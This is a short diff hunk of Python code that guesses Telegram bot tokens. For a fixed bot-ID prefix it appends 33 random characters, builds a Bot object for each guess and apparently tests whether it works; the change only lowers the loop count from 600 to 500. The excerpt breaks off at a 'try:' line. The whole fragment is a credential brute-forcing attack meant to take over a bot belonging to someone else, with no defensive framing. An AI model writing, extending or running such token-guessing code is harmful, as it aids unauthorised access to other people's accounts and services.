@@ -1,6 +1,6 @@
 #ADMlNxd 2.004
 chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
-for k in range(600):
+for k in range(500):
   token = "609517172:AA" + "".join(random.choices(chars,k=33))
   new_bot = Bot(token)
   try:
